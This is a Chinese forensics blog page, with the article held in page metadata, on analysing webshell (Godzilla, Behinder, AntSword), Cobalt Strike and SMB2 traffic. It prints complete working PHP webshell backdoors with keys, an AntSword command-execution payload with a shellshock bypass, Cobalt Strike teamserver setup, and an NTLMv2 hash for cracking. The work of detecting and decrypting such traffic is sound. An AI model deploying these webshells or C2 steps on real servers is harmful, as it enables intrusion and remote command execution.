<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>流量分析 | w8nn9z Blog</title>
<meta name="keywords" content="">
<meta name="description" content="流量分析 - w8nn9z Blog">
<meta name="author" content="">
<link rel="canonical" href="https://z9nn8w.github.io/posts/forensics/llfx/">

<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/forensics/llfx/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/forensics/llfx/">
  <meta property="og:site_name" content="w8nn9z Blog">
  <meta property="og:title" content="流量分析">
  <meta property="og:locale" content="zh-cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-11-04T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-11-27T00:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="流量分析">
<meta name="twitter:description" content="">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://z9nn8w.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "FORENSICS",
      "item": "https://z9nn8w.github.io/posts/forensics/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "流量分析",
      "item": "https://z9nn8w.github.io/posts/forensics/llfx/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "流量分析",
  "name": "流量分析",
  "description": "",
  "keywords": [
    
  ],
  "articleBody": "tshark的使用 webshell流量 哥斯拉流量 https://github.com/BeichenDream/Godzilla\n分析版本：Godzilla 4.01\n基本配置界面：\nPassword：请求参数名\nKey：计算密钥的md5值，然后取其前16位用于加密过程\n请求配置界面：\n自定义header以及在请求时添加干扰数据\n在 Manage -\u003e GenerateShell 中生成webshell：\n4种payload：\n每种payload都可以选择不同的Encryptor，分析部分以PhpDynamicPayload为例\nphp_xor_base64 webshell：\n\u003c?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } $pass='pass'; $payloadName='payload'; $key='3c6e0b8a9c15224a'; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\"getBasicsInfo\")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,\"getBasicsInfo\")!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 上传到目标url下后续通过Target即可连上webshell\n尝试执行whoami并用wireshark抓取流量进行分析：\n请求包：\npass=fL1tMGI4YTljzn78f8Wo%2FyhTl1UCWCn3LmDlfWRkKzUxH296TG6bt%2B2%2F%2BxNczoCdLcxgKWf5RJxKpMRUFBQXAvtrNaTNJ38nzW6naG6Wzpc1qPSv%2BqPInQNVklSqrzuh8qmHp%2Fqjq%2F1uBQ6HEAG4ClwBUgFNPWFjapfQQTI0YQ%3D%3D 响应包：\n11cd6a8758984163fL1tMGI4YTljO357H/pP+kzmKPpWiVHzUL/8e///TviE02cwwBczo3sxNTI=6c37ac826a2a04bc 可以发现请求包中是可以获取到密码配置信息的：pass\n所以即使题目流量里没有给出上传的webshell，也可以通过爆破来获取密钥，原因在于响应包中是输出了拼接pass和key后的md5信息的：\necho substr(md5($pass.$key),0,16); // 前16位，本例中为 11cd6a8758984163 echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); // 后16位，本例中为 6c37ac826a2a04bc 真正的执行结果为：\nfL1tMGI4YTljO357H/pP+kzmKPpWiVHzUL/8e///TviE02cwwBczo3sxNTI= 验证：\n爆破脚本：\nimport hashlib def md5_encode(text): return hashlib.md5(text.encode('utf-8')).hexdigest() def crack_key(key, pass_key_hash): Pass = \"pass\" for k in key: key_hash_16 = md5_encode(k)[:16] # 密钥的md5前16位 hash = md5_encode(Pass + key_hash_16) if pass_key_hash == hash: print(\"爆破密钥成功\") print(f\"密钥: {k}\") print(f\"密钥md5前16位为 {key_hash_16}\") return k print(\"密钥爆破失败\") if __name__ == '__main__': hash_0_16 = \"11cd6a8758984163\" hash_16_32 = \"6c37ac826a2a04bc\" pass_key_hash = hash_0_16 + hash_16_32 # 设置key 爆破字典 with open(\"dict.txt\",'r') as f: key = f.read().split() crack_key(key, pass_key_hash) 根据webshell中的encode逻辑，可以看出只是一个 xor + base64 操作，run函数里面才是真正执行命令的部分，要获取run函数只要修改一下原本的webshell，输出 $payload 即可，里面提到gzip编码输出以及解码输入：\nfunction run($pms){ // ... (其他代码) // *** Gzip 解码输入数据 *** if (canCallGzipDecode()==1\u0026\u0026@isGzipStream($pms)){ $pms=gzdecode($pms); // 这里是关键点之一：对传入参数 $pms 进行 gzdecode } formatParameter($pms); // ... (执行代码) $result=@evalFunc(); // 获取执行结果 // ... (处理 Session 和错误) // *** Gzip 编码输出结果 *** if ($_SES!==null){ /* ... session save ... */ } if (canCallGzipEncode()){ $result=gzencode($result,6); // 这里的关键点之二：对输出结果 $result 进行 gzencode } return $result; } 直接用cyberchef就可以解出命令和执行结果，还要注意根据encode逻辑异或得从key的第二个字符开始：\nphp_eval_xor_base64 webshell：\n\u003c?php eval($_POST[\"pass\"]); 流量包：\n执行的代码：\n@session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } $pass='key'; $payloadName='payload'; $key='3c6e0b8a9c15224a'; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\"getBasicsInfo\")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,\"getBasicsInfo\")!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 这里的pass变成了key：\nkey=fL1tMGI4YTljzn78f8Wo%2FyhTl1UCWCn3LmDlfWRkKzUxH296TG6bt%2B2%2F%2BxNczoCdLcxgKWf5RJxKpMRUFBQXAvtrNaTNJ38nzW6naG6Wzpc1qPSv%2BqPInQNVklSqrzuh8qmHp%2Fqjq%2F1uBQ6HEAG4ClwBUgFNPWFjapfQQTI0YQ%3D%3D 执行的命令：\n执行结果：\nphp_xor_raw 本质上都是xor，与 php_xor_base64 的区别是没有进行base64编码，从流量中导出参数时需要设置为raw，cyberchef解密时加一层 from hex\nwebshell：\n\u003c?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName='payload'; $key='3c6e0b8a9c15224a'; $data=file_get_contents(\"php://input\"); if ($data!==false){ $data=encode($data,$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\"getBasicsInfo\")===false){ $payload=encode($payload,$key); } eval($payload); echo encode(@run($data),$key); }else{ if (strpos($data,\"getBasicsInfo\")!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 流量包：\nASCII -\u003e Raw：\n执行的命令：\n执行结果：\n冰蝎流量 https://github.com/rebeyond/Behinder\n分析版本：Behinder 4.1\n配置界面：\n和哥斯拉不同的是每种加密函数都有对应的解密函数给出，默认密钥 e45e329feb5d925b\n通过生成服务端来获取webshell，还是以php代码为例\ndefault_xor_base64 Encrypt：\nfunction Encrypt($data) { $key=\"e45e329feb5d925b\"; for($i=0;$i\u003cstrlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1\u002615]; } $bs=\"base64_\".\"encode\"; $after=$bs($data.\"\"); return $after; } Decrypt：\nfunction Decrypt($data) { $key=\"e45e329feb5d925b\"; $bs=\"base64_\".\"decode\"; $after=$bs($data.\"\"); for($i=0;$i\u003cstrlen($after);$i++) { $after[$i] = $after[$i]^$key[$i+1\u002615]; } return $after; } webshell：\n\u003c?php @error_reporting(0); function Decrypt($data) { $key=\"e45e329feb5d925b\"; $bs=\"base64_\".\"decode\"; $after=$bs($data.\"\"); for($i=0;$i\u003cstrlen($after);$i++) { $after[$i] = $after[$i]^$key[$i+1\u002615]; } return $after; } $post=Decrypt(file_get_contents(\"php://input\")); @eval($post); ?\u003e 流量包：\n请求部分进行 base64 + xor 解密获取执行的命令：\n@error_reporting(0); function getSafeStr($str){ $s1 = iconv('utf-8','gbk//IGNORE',$str); $s0 = iconv('gbk','utf-8//IGNORE',$s1); if($s0 == $str){ return $s0; }else{ return iconv('gbk','utf-8//IGNORE',$str); } } function main($cmd,$path) { @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time', 0); $result = array(); $PadtJn = @ini_get('disable_functions'); if (! empty($PadtJn)) { $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn); $PadtJn = explode(',', $PadtJn); $PadtJn = array_map('trim', $PadtJn); } else { $PadtJn = array(); } $c = $cmd; if (FALSE !== strpos(strtolower(PHP_OS), 'win')) { $c = $c . \" 2\u003e\u00261\\n\"; } $JueQDBH = 'is_callable'; $Bvce = 'in_array'; if ($JueQDBH('system') and ! $Bvce('system', $PadtJn)) { ob_start(); system($c); $kWJW = ob_get_contents(); ob_end_clean(); } else if ($JueQDBH('proc_open') and ! $Bvce('proc_open', $PadtJn)) { $handle = proc_open($c, array( array( 'pipe', 'r' ), array( 'pipe', 'w' ), array( 'pipe', 'w' ) ), $pipes); $kWJW = NULL; while (! feof($pipes[1])) { $kWJW .= fread($pipes[1], 1024); } @proc_close($handle); } else if ($JueQDBH('passthru') and ! $Bvce('passthru', $PadtJn)) { ob_start(); passthru($c); $kWJW = ob_get_contents(); ob_end_clean(); } else if ($JueQDBH('shell_exec') and ! $Bvce('shell_exec', $PadtJn)) { $kWJW = shell_exec($c); } else if ($JueQDBH('exec') and ! $Bvce('exec', $PadtJn)) { $kWJW = array(); exec($c, $kWJW); $kWJW = join(chr(10), $kWJW) . chr(10); } else if ($JueQDBH('exec') and ! $Bvce('popen', $PadtJn)) { $fp = popen($c, 'r'); $kWJW = NULL; if (is_resource($fp)) { while (! feof($fp)) { $kWJW .= fread($fp, 1024); } } @pclose($fp); } else { $kWJW = 0; $result[\"status\"] = base64_encode(\"fail\"); $result[\"msg\"] = base64_encode(\"none of proc_open/passthru/shell_exec/exec/exec is available\"); $key = $_SESSION['k']; echo encrypt(json_encode($result)); return; } $result[\"status\"] = base64_encode(\"success\"); $result[\"msg\"] = base64_encode(getSafeStr($kWJW)); echo encrypt(json_encode($result)); } function Encrypt($data) { $key=\"e45e329feb5d925b\"; for($i=0;$i\u003cstrlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1\u002615]; } $bs=\"base64_\".\"encode\"; $after=$bs($data.\"\"); return $after; } $cmd=\"Y2QgL2QgIkQ6XEFBQUNURlxXRUJccGhwU3R1ZHlfNjRccGhwc3R1ZHlfcHJvXFdXV1x0ZXN0XCImd2hvYW1p\";$cmd=base64_decode($cmd);$path=\"RDovQUFBQ1RGL1dFQi9waHBTdHVkeV82NC9waHBzdHVkeV9wcm8vV1dXL3Rlc3Qv\";$path=base64_decode($path); main($cmd,$path); 可以看出执行的命令就是$cmd，命令执行目录为$path，返回的响应包中是一个encrypt过的json，里面有两条信息 $status 和 $msg，都是base64编码过的，其中$msg为执行结果：\naes_with_magic Encrypt：\nfunction Encrypt($data) { $key=\"e45e329feb5d925b\"; $encrypted=base64_encode(openssl_encrypt($data, \"AES-128-ECB\", $key,OPENSSL_PKCS1_PADDING)); $magicNum=hexdec(substr($key,0,2))%16; for($i=0;$i\u003c$magicNum;$i++) { $encrypted=$encrypted.chr(mt_rand(0, 255)); } return $encrypted; } Decrypt：\nfunction Decrypt($data) { $key=\"e45e329feb5d925b\"; $magicNum=hexdec(substr($key,0,2))%16; $data=substr($data,0,strlen($data)-$magicNum); return openssl_decrypt(base64_decode($data), \"AES-128-ECB\", $key,OPENSSL_PKCS1_PADDING); } webshell：\n\u003c?php @error_reporting(0); function Decrypt($data) { $key=\"e45e329feb5d925b\"; $magicNum=hexdec(substr($key,0,2))%16; $data=substr($data,0,strlen($data)-$magicNum); return openssl_decrypt(base64_decode($data), \"AES-128-ECB\", $key,OPENSSL_PKCS1_PADDING); } $post=Decrypt(file_get_contents(\"php://input\")); @eval($post); ?\u003e aes_with_magic 会在尾部添加几个随机字符用于干扰，长度根据 $magicNum 而定，比如本例中为4，又因为没有传入IV，所以解密时初始向量为 \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\n流量包，请求包尾部有4个额外字符：\n解密出执行内容以后，后续解密执行命令和执行结果都与之前没有区别：\ndefault_aes webshell：\n\u003c?php @error_reporting(0); function Decrypt($data) { $key=\"e45e329feb5d925b\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond return openssl_decrypt(base64_decode($data), \"AES-128-ECB\", $key,OPENSSL_PKCS1_PADDING); } $post=Decrypt(file_get_contents(\"php://input\")); @eval($post); ?\u003e 和aes_with_magic的唯一区别是没有干扰字符，直接就可以拿请求包的数据进行解密\n中国蚁剑 https://github.com/AntSwordProject/antSword\n蚁剑能配置自定义编码器：\n这里用蚁剑自带的进行分析\nwebshell：\n\u003c?php @eval($_REQUEST[1]); ?\u003e 流量包：\nURL Decode一下传入的参数：\n1=@ini_set(\"display_errors\", \"0\");@set_time_limit(0);$opdir=@ini_get(\"open_basedir\");if($opdir) {$ocwd=dirname($_SERVER[\"SCRIPT_FILENAME\"]);$oparr=preg_split(base64_decode(\"Lzt8Oi8=\"),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item.\"/.6c8e53\";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set(\"open_basedir\", \"..\");$cntarr=@preg_split(\"/\\\\\\\\|\\//\",$tmdir);for($i=0;$i\u003csizeof($cntarr);$i++){@chdir(\"..\");};@ini_set(\"open_basedir\",\"/\");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo \"e41\".\"be6d\";echo @asenc($output);echo \"d8c66d\".\"0bb0fb\";}ob_start();try{$p=base64_decode(substr($_POST[\"beb61c5242a79d\"],2));$s=base64_decode(substr($_POST[\"t785fa3d878e6e\"],2));$envstr=@base64_decode(substr($_POST[\"g64b1274b158be\"],2));$d=dirname($_SERVER[\"SCRIPT_FILENAME\"]);$c=substr($d,0,1)==\"/\"?\"-c \\\"{$s}\\\"\":\"/c \\\"{$s}\\\"\";if(substr($d,0,1)==\"/\"){@putenv(\"PATH=\".getenv(\"PATH\").\":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\");}else{@putenv(\"PATH=\".getenv(\"PATH\").\";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;\");}if(!empty($envstr)){$envarr=explode(\"|||asline|||\", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace(\"|||askey|||\", \"=\", $v));}}}$r=\"{$p} {$c}\";function fe($f){$d=explode(\",\",@ini_get(\"disable_functions\"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)\u0026\u0026is_callable($f)\u0026\u0026!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == \"/\" \u0026\u0026 fe('putenv') \u0026\u0026 (fe('error_log') || fe('mail'))) {if (strstr(readlink(\"/bin/sh\"), \"bash\") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv(\"PHP_LOL=() { x; }; $c \u003e$tmp 2\u003e\u00261\");if (fe('error_log')) {error_log(\"a\", 1);} else {mail(\"a@127.0.0.1\", \"\", \"\", \"-bv\");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != \"\") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER[\"SCRIPT_FILENAME\"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join(\" \",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 =\u003e array('pipe', 'w'), 2 =\u003e array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!=\"/\" \u0026\u0026 @class_exists(\"COM\")){$w=new COM('WScript.shell');$e=$w-\u003eexec($c);$so=$e-\u003eStdOut();$ret.=$so-\u003eReadAll();$se=$e-\u003eStdErr();$ret.=$se-\u003eReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r.\" 2\u003e\u00261\");print ($ret!=0)?\"ret={$ret}\":\"\";;}catch(Exception $e){echo \"ERROR://\".$e-\u003egetMessage();};asoutput();die();\u0026beb61c5242a79d=UwY21k\u0026g64b1274b158be=ne\u0026t785fa3d878e6e=2fY2QgL2QgIkQ6L0FBQUNURi9XRUIvcGhwU3R1ZHlfNjQvcGhwc3R1ZHlfcHJvL1dXVy90ZXN0IiZ3aG9hbWkmZWNobyA1ZTYzMTFkMDQmY2QmZWNobyBmZGFjNzgyNTQx 分析一下可以知道：\n$p=base64_decode(substr($_POST[\"beb61c5242a79d\"],2)); // 程序路径 $s=base64_decode(substr($_POST[\"t785fa3d878e6e\"],2)); // 实际命令 $envstr=@base64_decode(substr($_POST[\"g64b1274b158be\"],2)); // 环境变量 蚁剑比较特殊的是会在参数值前加上2个干扰字符，所以就有了 substr 从第三个字符开始进行解码，并且在输出内容的前后加上特定的十六进制字符串 e41be6d 和 d8c66d0bb0fb，这也是蚁剑的特征：\nCobalt Strike流量 分析版本：Cobalt Strike 4.0\nC/S架构：\ncs分为客户端和服务器端，使用cs时必须要启用TeamServer服务器，需要有可执行权限，TeamServer功能：\n控制 - Team Server是Cobalt Strike中所有payload的主控制器，与victim的所有连接 bind/reverse 都由Team Server管理。\r日志记录 - Cobalt Strike中发生的所有事件 保存在logs文件夹\r信息搜集 - 收集在后渗透阶段发现的、或攻击者在目标系统上用于登录的所有凭据credentials\r自定义脚本 - cat teamserver可看到该文件是一个简单的bash脚本(可根据自己要求修改) 调用Metasploit RPC服务msfrpcd并启动服务器cobaltstrike.jar cs使用基本流程：\n1.启动TeamServer\r2.Client登录TeamServer 启动TeamServer，默认端口50050，可以通过编辑teamserver文件修改：\n$ sudo ./teamserver [*] Will use existing X509 certificate and keystore (for SSL) [*] ./teamserver [/path/to/c2.profile] [YYYY-MM-DD] is the (default) IP address of this Cobalt Strike team server is the shared password to connect to this server [/path/to/c2.profile] is your Malleable C2 profile [YYYY-MM-DD] is a kill date for Beacon payloads run from this server ：必填，服务器公网ip或域名\r：必填，客户端Client GUI连接服务器TeamServer的密码\r[/path/to/c2.profile]：选填，指定C2通信配置文件\r[YYYY-MM-DD]：所有payload的终止日期 Client登录TeamServer，启动cobaltstrike.jar：\njava -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar 需要填写一些基本信息：\n可通过Cobalt Strike - \u003e Preferences - \u003e Team Servers维护本地的登录信息配置文件的列表team server profiles\n登陆成功后就能看到GUI界面\nCobalt Strike - \u003e Preferences - \u003e Listeners，cs4.0 一共8种listener：\nhttp-beacon 配置listener：\n生成windows可执行程序，staged对应artifact.exe，stageless对应beacon.exe，有明显的大小区别并且stageless没有stage下载的步骤：\n以artifact.exe为例进行流量抓取和分析：\n靶机运行stager后会自动进行stage下载，stager对应的请求路径并非真实存在，比如 /WCTo，但是满足一定要求 (checksum8)，路径的 ascii 之和与 256 取余计算值得到结果，32位后门结果为92，64位后门结果为93，这样stager就知道要返回stage：\n可以用 metatool 来检验一下:\n用 1768.py 来分析 stage，如果存在已知私钥会在publickey之后显示 Has Known private key，本例并不存在已知私钥：\nstage 被加载和执行后的运行状态也就是最终的恶意程序Beacon，Beacon 与 C2 服务器之间的加密机制采用混合加密模式，以确保通信的机密性和效率：\n公钥交换与会话建立 (元数据加密): 在 Beacon 首次连接（或心跳回连）时，它会使用内置的 C2 公钥 (RSA) 来加密一个随机生成的会话密钥 (Session Key) 和初始元数据\r私钥解密: Team Server 收到该数据后，使用其对应的 私钥 (RSA) 将其解密，从而安全地获得这个一次性的会话密钥\r对称加密 (后续通信): 一旦会话密钥建立，Beacon 与 C2 之间的后续所有命令、执行结果和数据传输，都将使用这个会话密钥进行 AES 对称加密 可以根据 1768.py 脚本执行结果对cs流量进行初步分析：\n0x0001 payload type 0x0001 0x0002 0 windows-beacon_http-reverse_http\r0x0002 port 0x0001 0x0002 80\r0x0003 sleeptime 0x0002 0x0004 60000\r0x0007 publickey 0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100ad0a7e620a2f982cecd21f35961a7d02002ff6e04c5ca148398c8bfb4beadc72b337efe5b7fe0219fb54f9a17d70fd3d20e3c62b53e96813a0b077045cd4b7ef9e743450a85ba8d25bb65500c00bcdcd00594d54d0da24829827cbb5a64248e082165c024ddbb31e117a69a49893d3006e8b3b74f8c8a577b96ad2b9f8af04cf020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\r0x0008 server,get-uri 0x0003 0x0100 '192.168.50.128,/IE9CompatViewList.xml'\r0x000a post-uri 0x0003 0x0040 '/submit.php' payload类型即监听器类型，心跳包间隔时间，回连ip/端口，get/post请求路径这些关键信息都有，方便后续从流量里定位重要信息\n先来看GET的流量包：\nC2 Profile 决定了元数据编码的位置，本例中利用 Cookie 携带信息 (Metadata) 传递给C2服务器，可以用 cs-decrypt-metadata.py 来解密元数据，但是需要用到私钥，如果是题目可能会给出私钥文件 .cobaltstrike.beacon_keys，这时可以用 parse_beacon_keys.py 来解析出公私钥：\n将私钥变成hex形式：\n再用 cs-decrypt-metadata.py 解出 rawkey, aeskey 和 hmackey，可以看到还有靶机ip 用户名等信息：\n最后就可以用 cs-parse-http-traffic.py 来解密整段cs流量，需要提供原始密钥 rawkey：\n从第478个包开始响应中包含需要执行的命令，但是直接过滤器配置 frame.number \u003e= 278 即可，避免遗漏命令，可以发现我抓取的整段cs流量最终在靶机上只执行了一个命令 whoami\ncs流量分析利用到的工具：\nhttps://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py\nhttps://github.com/DidierStevens/Beta/blob/master/metatool.py\nhttps://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py\nhttps://github.com/Slzdude/cs-scripts/blob/master/parse_beacon_keys.py\nhttps://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py\nSMB2 解密SMB2流量需要构造哈希进行爆破获取密码，格式：username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response\n过滤器设置ntlmssp来获取认证握手，NTLMSSP_AUTH包中Security Blob层：\n再过滤ntlmssp.ntlmserverchallenge：\n构造出完整哈希，注意流量里的ntlmv2response开头为NTproofstring，需要删除：\nroot::.:924ca077500cd533:e43ae3e491ffe96bca5383b9c0bc4946:0101000000000000b6ca87356b64dc01eca054741fa479e600000000020008004b0041004c004900010008004b0041004c00490004000000030008006b0061006c00690007000800b6ca87356b64dc0106000400020000000800300030000000000000000100000000200000e5528e00f4d9b3bf475abbb1d4e90ac0163587fccd7d2e8aafdb9b455327e48d0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00350030002e003100320038000000000000000000 也可以直接通过NTLMv2 hash抓取工具NTLMRawUnHide来直接获取哈希：\nhashcat爆破密码：\n如果要查看通过SMB传输的文件，在wireshark中导出SMB对象即可：\n参考资料：\nhttps://goodlunatic.github.io/posts/5422d65/\nhttps://www.ddosi.org/cobaltstrike/\nhttps://xz.aliyun.com/news/3607\nhttps://www.ddosi.org/cs-decrypt-1/\nhttps://www.ddosi.org/cs-decrypt-2/\nhttps://www.secpulse.com/archives/106276.html\n",
  "wordCount" : "4265",
  "inLanguage": "en",
  "datePublished": "2024-11-04T00:00:00Z",
  "dateModified": "2025-11-27T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://z9nn8w.github.io/posts/forensics/llfx/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "w8nn9z Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://z9nn8w.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/posts" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/archives" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/about" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      流量分析
    </h1>
    <div class="post-meta"><span title='2024-11-04 00:00:00 +0000 UTC'>November 4, 2024</span>

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details >
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#tshark%e7%9a%84%e4%bd%bf%e7%94%a8" aria-label="tshark的使用">tshark的使用</a></li>
                    <li>
                        <a href="#webshell%e6%b5%81%e9%87%8f" aria-label="webshell流量">webshell流量</a><ul>
                            
                    <li>
